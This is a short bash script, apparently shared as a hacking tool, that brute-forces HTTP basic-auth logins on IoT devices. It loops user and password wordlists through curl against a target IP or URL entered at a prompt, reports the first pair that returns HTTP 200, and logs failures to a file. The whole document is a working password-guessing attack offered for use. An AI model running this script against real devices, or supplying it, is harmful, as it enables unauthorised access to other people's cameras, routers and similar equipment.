
                   ######Simple UID:PASS checker for IoT Devices######
                       #####Brought to you by .0. sudo_KING#####

#!/bin/bash

read -p " Input Target IP or URL and Hit Enter: " ADDRESS

url=$ADDRESS
for user in $(cat <user wordlist>); do 
  for pass in $(cat <pass wordlist>); do
    http_code=$(curl -v -L -u "$user":"$pass" "$url" -w '%{http_code}' -o /dev/null -s)
    if [[ $http_code -eq 200 ]]; then
      echo "Success: Address:'$ADDRESS' User:'$user' Pass:'$pass'"
      break
else echo  "Failed: "$user" and "$pass" on "$ADDRESS"" >> <Specify Location and Name of Out File>
    fi
  done
done

#EOF
